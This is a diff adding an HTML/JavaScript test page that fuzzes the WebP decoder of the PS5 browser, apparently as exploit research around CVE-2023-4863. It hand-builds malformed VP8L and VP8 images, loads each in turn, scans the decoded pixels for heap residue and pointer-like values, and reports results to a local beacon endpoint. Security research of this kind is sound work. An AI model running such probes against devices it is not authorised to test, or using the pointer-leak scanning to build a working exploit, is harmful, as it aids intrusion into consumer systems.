@@ -1,0 +1,149 @@
+<!--
+  p609: WebP decoder vulnerability surface exploration
+
+  WebP confirmed functional on PS5 14.10, NEVER fuzzed with malformed input.
+  CVE-2023-4863 (libwebp VP8L Huffman table heap overflow) patched Sep 2023.
+  Sony's WebKit port likely uses libwebp directly (no Apple ImageIO).
+  Safari 17.0 / WebKit 605.1.15 shipped 2 weeks after the fix.
+
+  21 tests: valid baselines, VP8L truncations, garbage data, oversized
+  dimensions, chunk size mismatches, full Huffman trigger, VP8 lossy fuzzing.
+
+  Sequential execution with localStorage crash recovery.
+  Pixel scan on successful loads for heap residue detection.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p609</title>
+<script>
+var bx=new XMLHttpRequest();
+function b(m){try{bx.open('GET','/beacon/'+encodeURIComponent(m),false);bx.send();}catch(e){}}
+function bp(m,d){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent(m),false);x.send(d);}catch(e){}}
+
+// Byte array helpers
+function Z(n){var a=[];for(var i=0;i<n;i++)a.push(0);return a;}
+function F(n,v){var a=[];for(var i=0;i<n;i++)a.push(v);return a;}
+function P(n){var a=[],s=0xDEAD;for(var i=0;i<n;i++){s^=(s<<13);s^=(s>>>17);s^=(s<<5);a.push(s&0xFF);}return a;}
+
+// RIFF/WebP container builders
+function riff(cc,p){
+    var cs=p.length,pad=cs&1,fs=4+cc.length+4+cs+pad;
+    var r=[0x52,0x49,0x46,0x46,fs&0xFF,(fs>>8)&0xFF,(fs>>16)&0xFF,(fs>>24)&0xFF,
+           0x57,0x45,0x42,0x50];
+    for(var i=0;i<cc.length;i++)r.push(cc.charCodeAt(i));
+    r.push(cs&0xFF,(cs>>8)&0xFF,(cs>>16)&0xFF,(cs>>24)&0xFF);
+    for(var i=0;i<cs;i++)r.push(p[i]);
+    if(pad)r.push(0);
+    return new Uint8Array(r);
+}
+// VP8L: signature 0x2F + image header + compressed data
+function L(w,h,al,cd){
+    var hd=((w-1)&0x3FFF)|(((h-1)&0x3FFF)<<14)|((al?1:0)<<28);
+    var p=[0x2F,hd&0xFF,(hd>>8)&0xFF,(hd>>16)&0xFF,(hd>>24)&0xFF];
+    for(var i=0;i<cd.length;i++)p.push(cd[i]);
+    return riff('VP8L',p);
+}
+// VP8L with raw payload (caller provides everything including 0x2F)
+function LR(b){return riff('VP8L',b);}
+// VP8L with lying chunk size field
+function LS(w,h,al,cd,fcs){
+    var hd=((w-1)&0x3FFF)|(((h-1)&0x3FFF)<<14)|((al?1:0)<<28);
+    var p=[0x2F,hd&0xFF,(hd>>8)&0xFF,(hd>>16)&0xFF,(hd>>24)&0xFF];
+    for(var i=0;i<cd.length;i++)p.push(cd[i]);
+    var pn=p.length,pad=pn&1,fs=4+8+pn+pad;
+    var r=[0x52,0x49,0x46,0x46,fs&0xFF,(fs>>8)&0xFF,(fs>>16)&0xFF,(fs>>24)&0xFF,
+           0x57,0x45,0x42,0x50,0x56,0x50,0x38,0x4C,
+           fcs&0xFF,(fcs>>8)&0xFF,(fcs>>16)&0xFF,(fcs>>24)&0xFF];
+    for(var i=0;i<p.length;i++)r.push(p[i]);
+    if(pad)r.push(0);
+    return new Uint8Array(r);
+}
+// VP8 lossy container
+function V8(d){return riff('VP8 ',d);}
+
+// Valid VP8L compressed data (hand-crafted, LSB-first bit packing):
+// Red 1x1 (G=0,R=255,B=0,A=255): [0x88,0xFE,0x47,0xFF,0x03]
+// Black 1x1 (G=0,R=0,B=0,A=255): [0x88,0x88,0xFE,0x07]
+// Encoding: no_transform(0) no_cache(0) no_meta(0) then 5 simple Huffman trees
+var T=[
+// 0-2: Valid baselines (should decode correctly)
+['VP8L-RED',L(1,1,1,[0x88,0xFE,0x47,0xFF,0x03])],
+['VP8L-BLK',L(1,1,0,[0x88,0x88,0xFE,0x07])],
+['VP8L-4K',L(4096,4096,0,[0x88,0x88,0xFE,0x07])],
+// 3-6: VP8L truncations (decoder reads past buffer?)
+['VP8L-T-SIG',LR([0x2F])],
+['VP8L-T-HDR',LR([0x2F,0x00,0x00,0x00,0x00])],
+['VP8L-T-1B',L(1,1,0,[0x88])],
+['VP8L-T-3B',L(1,1,0,[0x88,0x88,0xFE])],
+// 7-9: Garbage compressed data (invalid Huffman trees)
+['VP8L-Z64',L(1,1,0,Z(64))],
+['VP8L-F64',L(1,1,0,F(64,0xFF))],
+['VP8L-P256',L(1,1,0,P(256))],
+// 10-12: Oversized dims + minimal data (OOM / overread trigger)
+['VP8L-16K-Z',L(16384,16384,0,Z(32))],
+['VP8L-16K-F',L(16384,16384,0,F(1024,0xFF))],
+['VP8L-256-P',L(256,256,0,P(16))],
+// 13-14: Chunk size mismatch (size field lies)
+['VP8L-CS64K',LS(1,1,0,[0x88,0x88,0xFE,0x07],65536)],
+['VP8L-CS0',LS(1,1,0,[0x88,0x88,0xFE,0x07],0)],
+// 15: Full Huffman table path (not simple_code, forces deep decoder)
+// Byte 0: bits 0-2=000(no xform/cache/meta) bit3=0(NOT simple) bits4-7=1111(19 code lens)
+['VP8L-FHUF',L(4,4,0,[0xF0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00])],
+// 16: Bad VP8L signature byte (0x00 instead of 0x2F)
+['VP8L-BSIG',LR([0x00,0x00,0x00,0x00,0x00,0x88,0x88,0xFE,0x07])],
+// 17-20: VP8 lossy fuzzing
+['VP8-T4',V8([0x10,0x00,0x00,0x9D])],
+['VP8-HDR',V8([0x10,0x00,0x00,0x9D,0x01,0x2A,0x01,0x00,0x01,0x00])],
+['VP8-GAR',V8([0x10,0x00,0x00,0x9D,0x01,0x2A,0x04,0x00,0x04,0x00].concat(P(256)))],
+['VP8-FF',V8(F(256,0xFF))]
+];
+
+// Scan decoded pixels for heap residue or pointer-like values
+function scan(img,tag){
+    try{
+        var w=Math.min(img.width||1,256),h=Math.min(img.height||1,256);
+        var c=document.createElement('canvas');c.width=w;c.height=h;
+        var ctx=c.getContext('2d');ctx.drawImage(img,0,0,w,h);
+        var pd=ctx.getImageData(0,0,w,h),d=pd.data,nz=0,uv={},uc=0;
+        for(var i=0;i<d.length;i+=4){
+            var k=d[i]+','+d[i+1]+','+d[i+2]+','+d[i+3];
+            if(k!=='0,0,0,0'&&k!=='0,0,0,255'){nz++;if(!uv[k]){uv[k]=1;uc++;}}
+        }
+        b(tag+'-PX-nz='+nz+'/'+Math.floor(d.length/4)+'-u='+uc);
+        if(uc>0&&uc<=8){var s=[];for(var k in uv){s.push(k);if(s.length>=5)break;}b(tag+'-V='+s.join('|'));}
+        // Check for pointer-like patterns in pixel data (8-byte aligned)
+        var pl=0;
+        for(var i=0;i+7<d.length;i+=8){
+            var hi=(d[i+7]<<24)|(d[i+6]<<16)|(d[i+5]<<8)|d[i+4];
+            if((hi>>>16)>=0x7F00)pl++;
+        }
+        if(pl>0)b(tag+'-PTRS='+pl);
+    }catch(e){b(tag+'-PXE='+e.message);}
+}
+
+function main(){
+    if(typeof Blob==='undefined'||typeof URL==='undefined'){b('NO-BLOB-API');return;}
+    var t0=Date.now();
+    b('P609-WEBP-'+T.length+'T');
+    var sk=0;try{sk=parseInt(localStorage.getItem('p609s')||'0');}catch(e){}
+    if(sk>0)b('SKIP='+sk);
+
+    function run(i){
+        if(i>=T.length){b('P609-DONE-'+(Date.now()-t0)+'ms');try{localStorage.removeItem('p609s');}catch(e){}return;}
+        try{localStorage.setItem('p609s',String(i+1));}catch(e){}
+        b('T'+i+'-'+T[i][0]);
+        var blob=new Blob([T[i][1]],{type:'image/webp'});
+        var url=URL.createObjectURL(blob);
+        var img=new Image(),dn=false;
+        img.onload=function(){if(dn)return;dn=true;
+            b('T'+i+'-OK-'+img.width+'x'+img.height);
+            scan(img,'T'+i);URL.revokeObjectURL(url);run(i+1);};
+        img.onerror=function(){if(dn)return;dn=true;
+            b('T'+i+'-ERR');URL.revokeObjectURL(url);run(i+1);};
+        setTimeout(function(){if(!dn){dn=true;b('T'+i+'-TMO');URL.revokeObjectURL(url);run(i+1);}},5000);
+        img.src=url;
+    }
+    run(sk);
+}
+setTimeout(main,200);
+</script></head><body>p609: WebP surface</body></html>
